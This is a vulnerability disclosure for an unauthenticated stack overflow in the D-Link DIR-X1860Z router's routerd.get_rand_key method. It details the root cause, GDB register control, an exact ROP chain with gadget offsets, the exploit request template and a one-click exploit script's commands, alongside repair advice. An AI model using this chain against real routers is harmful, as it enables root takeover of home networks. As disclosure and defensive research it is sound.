# D-Link DIR-X1860Z Rev A `routerd.get_rand_key` `key_index` Stack Overflow and ROP

## Title

D-Link DIR-X1860Z Rev A 1.0.7.260821.161908 `routerd.get_rand_key` `key_index` Unauthenticated Stack-Based Buffer Overflow and Root Remote Code Execution

## Description

### 1. Vulnerability Name

Unauthenticated stack-based buffer overflow in the anonymous `routerd.get_rand_key` ubus method through the `key_index` parameter, resulting in control-flow hijacking and root command execution through ROP in the validated emulation layout.

### 2. Vulnerability Contributor and Submitter

- **Researcher**: Lumina
- **Contact**: 1547800591@qq.com

### 3. Vendor and Product Information

- **Vendor**: D-Link Corporation
- **Vendor homepage**: https://www.dlink.com/
- **Product**: D-Link DIR-X1860Z Rev A Router Operating System
- **Components**: `/bin/routerd` and `/lib/liblubus.so`
- **Network entry point**: HTTP `/ubus`
- **Affected method**: `routerd.get_rand_key`
- **Affected parameter**: `key_index`

![image-20261104192533096](DIR-X1860Z-V1.0.7-get-rand-key-stack-overflow-RCE.EN.assets/image-20261104192533096.png)

### 4. Affected Version

- **Firmware**: `V1.0.7.260821.161908` hotfix
- **Firmware file**: `DIR-X1860Z_V1.0.7.260821.161908_UPGRADE_ALL.bin`
- **Firmware package**: `DIR-X1860Z_REVA_FIRMWARE_V1.0.7.260821.161908_HOTFIX.zip`
- **SHA-256**: `630404424ae1825ae53a27228bd58f3f97b0372c8bee181a061bf3ff2a40adfa`
- **Architecture**: 32-bit little-endian ARM
- **Filesystem**: JFFS2

### 5. Vulnerability Class and Attack Conditions

- **Vulnerability class**: Stack-based buffer overflow leading to control-flow hijacking and remote command execution
- **CWE**: CWE-121 (Stack-based Buffer Overflow) and CWE-787 (Out-of-bounds Write)
- **Attack vector**: Network; adjacent networks by default, or remote networks if the management interface is exposed
- **Authentication required**: No
- **User interaction required**: No
- **Privileges gained**: Root (`uid=0`) in the validated emulation environment
- **Additional exploitation condition**: The supplied ROP chain requires the documented emulation library layout. Control-flow hijacking is independently confirmed, but real-device exploitation requires layout validation or a suitable address-independent chain.

### 6. Severity

An unauthenticated attacker who can reach HTTP `/ubus` can overflow a stack buffer in a core management daemon, overwrite saved registers and the return address, and hijack control flow. The issue was escalated to arbitrary root command execution in QEMU user-mode emulation. Even without a working ROP chain, an oversized request can disrupt `routerd` and the management plane.

### 7. Vulnerability Description

The anonymous `routerd.get_rand_key` method accepts an arbitrarily long hexadecimal `key_index` string. `routerd` supplies a 32-byte stack buffer to `liblubus.so!hexString2bin`, but neither the caller nor the conversion routine enforces the destination capacity. The conversion loop writes `strlen(key_index) / 2` bytes into the 32-byte buffer.

A 1,024-character hexadecimal string decodes to 512 bytes and overwrites saved registers and the return address. GDB confirmed attacker control of the PC and multiple registers. A ROP chain then invoked `routerd` `system@plt` with an attacker-controlled shell command. Command output and a fresh random marker were retrieved through an independent HTTP request, confirming end-to-end command execution rather than inferring success from a crash or timeout.

This is an independent memory-corruption vulnerability. It does not require another command-injection flaw or an authenticated session.

### 8. Technical Details and Root Cause

#### Anonymous ubus reachability

`/etc/acl.d/unauthenticated.json` permits unauthenticated read access to `get_rand_key`:

```json
{
  "read": {
    "routerd": ["get_rand_key", "param_status", "app_info"]
  },
  "write": {
    "routerd": ["login"]
  }
}
```

The following all-zero session value is sufficient to reach this anonymous method; it is not a valid authenticated session:

```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "method": "call",
  "params": [
    "00000000000000000000000000000000",
    "routerd",
    "get_rand_key",
    {"key_index": "<attacker-controlled hexadecimal string>"}
  ]
}
```

#### Caller-side length error

The internal `routerd` function `sub_14F88` creates a 32-byte stack array and passes it to the conversion routine with the attacker-controlled input length:

```asm
BL              sub_12D68
BL              strlen
SUB             R2, R11, #-(-0x14+s)  ; 32-byte stack destination
MOV             R1, R0                 ; unbounded attacker string length
MOV             R0, R5                 ; attacker-controlled key_index
BL              hexString2bin
CMP             R0, #0x10              ; checked only after the write
```

The `return value == 16` test occurs after the out-of-bounds write and therefore cannot prevent memory corruption.

#### Unbounded write in `hexString2bin`

The `hexString2bin` routine is located at `liblubus.so` offset `0x2c1d8`. Its interface has no destination-capacity argument. The relevant loop increments the destination index until the input length is exhausted:

```asm
LDRB            R12, [R0], #1
...
STRB            R4, [R2, R3]           ; R2=destination, R3=attacker-length-derived index
...
ADD             R3, R3, #1
BNE             loc_2C1F8
```

A 1,024-character `key_index` therefore produces a 512-byte write into a 32-byte stack buffer.

#### Control-flow confirmation

GDB captured the following state after sending a cyclic 512-byte decoded payload:

```text
Thread 2 received signal SIGSEGV, Segmentation fault.
0x54535250 in ?? ()

r4  = 0x5a595857
r5  = 0x44434241
r6  = 0x48474645
r7  = 0x4c4b4a49
r11 = 0x504f4e4d
pc  = 0x54535250
```

The PC and multiple registers are derived directly from the input. The saved return address is at decoded payload offset `120`. After the vulnerable function returns, SP points to payload offset `124`.

#### Validated ROP chain

`routerd` is non-PIE and NX is enabled. The final validation used the following layout and gadgets:

```text
libc base                       = 0x3f6b7000
mov r0, #0 ; pop {r3, pc}       = 0x3f6e2be0 (libc offset 0x2bbe0)
mov r0, sp ; blx r3             = 0x3f7ac784 (libc offset 0xf5784)
routerd system@plt              = 0x1260c
```

The chain is:

```text
payload[120:124] = mov r0, #0 ; pop {r3, pc}
payload[124:128] = routerd system@plt       ; popped into R3
payload[128:132] = mov r0, sp ; blx r3      ; next PC
payload[132:]    = NUL-terminated shell command
```

After `pop {r3, pc}`, SP points to payload offset `132`. The second gadget copies SP into R0 and calls `system@plt` through R3. This avoids embedding an absolute command-buffer address, although the libc gadget addresses still depend on the emulation library base.

The gadget instructions were checked directly in the ARM disassembly:

```asm
; libc offset 0x2bbe0
mov             r0, #0
pop             {r3, pc}

; libc offset 0xf5784
mov             r0, sp
blx             r3
```

The payload is sent as 1,024 hexadecimal characters in `key_index`. The final command string writes command output and a random marker to a unique file under `/www`, which is then retrieved independently over HTTP.

### 9. Proof of Concept

The following steps were reproduced against the emulated firmware at `192.168.135.137:23355`. Replace the host and port only with an authorized local test target. The original device management port is not assumed to be `23355`; this port was selected for emulation.

#### Request body

The Python script generates the complete 512-byte payload and encodes it as hexadecimal in the following JSON-RPC request:

```http
POST /ubus HTTP/1.1
Host: 192.168.135.137:23355
Content-Type: application/json
Connection: close

{
  "jsonrpc": "2.0",
  "id": 1,
  "method": "call",
  "params": [
    "00000000000000000000000000000000",
    "routerd",
    "get_rand_key",
    {
      "key_index": "<1024 hexadecimal characters containing the ROP payload>"
    }
  ]
}
```

The trigger request can time out or return a ubus timeout after control-flow hijacking. Neither condition is treated as proof of exploitation. Success requires command output and the current run's random marker in a newly created file retrieved by a separate request.

#### One-click command execution

The attached self-contained Python 3 script reproduces this issue without third-party dependencies. It restricts targets to local private and loopback networks, performs a web frontend/backend preflight, executes the requested command through ROP, and validates a fresh random marker through a separate HTTP GET.

Run only this vulnerability with the default `id` command:

```bash
python DIR-X1860Z_oneclick_exp.py --only rop
```

![image-20261104193715330](DIR-X1860Z-V1.0.7-get-rand-key-stack-overflow-RCE.EN.assets/image-20261104193715330.png)

Execute a custom command:

```bash
python DIR-X1860Z_oneclick_exp.py --only rop --command "uname -a"
```

Observed command output from the final validation:

```text
uid=0(root) gid=0(root) groups=0(root)
<fresh random marker>
```

![image-20261104193959706](DIR-X1860Z-V1.0.7-get-rand-key-stack-overflow-RCE.EN.assets/image-20261104193959706.png)

### 10. Impact

Successful exploitation provides unauthenticated root command execution in the validated environment. An attacker can read or modify device configuration, steal credentials, alter DNS and routing behavior, disrupt services, install persistent changes where storage permits, and attack connected LAN clients.

The overflow also corrupts the stack of a core management daemon and can terminate its worker or the daemon itself, causing management-plane denial of service even when a full command-execution chain is unavailable. The supplied ROP chain is evidence of exploitability in the documented emulation layout, not a claim of universal real-device reliability.

### 11. Repair Plan

1. Require `key_index` to contain exactly 32 hexadecimal characters before calling the conversion routine.
2. Change `hexString2bin` to accept a destination-capacity argument and reject odd-length input, non-hexadecimal characters, and `input_length / 2 > destination_capacity` before writing any output.
3. Apply consistent length validation to every ubus string parameter and add regression tests for oversized, odd-length, and non-hexadecimal values.
4. Reduce anonymous ubus exposure and move sensitive key-exchange operations behind appropriate authorization where protocol requirements permit.
5. Enable stack protectors and suitable compiler hardening, but do not use mitigations as a substitute for bounds checking.
6. Until a fix is available, restrict management access to trusted hosts and block untrusted access to HTTP `/ubus`.

### 12. Verification and Disclosure Notes

- **Evidence level**: **GDB_CONFIRMED + VALIDATED** for PC control and command execution in the documented emulation layout.
- The web frontend and required backend processes, including `uhttpd`, `ubusd`, and `routerd`, were running during validation.
- The vulnerable `routerd`, `liblubus.so`, and `libc` code used by the exploit were not patched to bypass authentication or enable the vulnerability.
- One emulation-only timing adjustment was made in `liboss.so`: `usleep(1)` was changed to `usleep(1024)` at offset `0xd82c` to avoid a QEMU startup race. This change did not modify the vulnerable conversion routine or its caller.
- Emulation port `23355` replaced the original management port to avoid host conflicts.
- Validation covered user-mode web/ubus emulation, not full hardware emulation or physical-device testing. Real-device reliability of the ROP chain remains unverified.
- The ROP trigger can leave `routerd` unavailable after command execution; the emulation services should be restarted between independent test runs.
- D-Link SAP10513 documents CVE-2026-94036 and CVE-2026-94050 in earlier versions. The previously exposed anonymous `passwd_set` and `wificfg_get` calls returned `Access denied` in this firmware. The memory-corruption issue described here is distinct from the previously disclosed information-disclosure chain involving `get_rand_key`.

The following supporting file is attached to this submission:

- `DIR-X1860Z_oneclick_exp.py` — self-contained Python 3 proof of concept; use `--only rop` for this vulnerability.
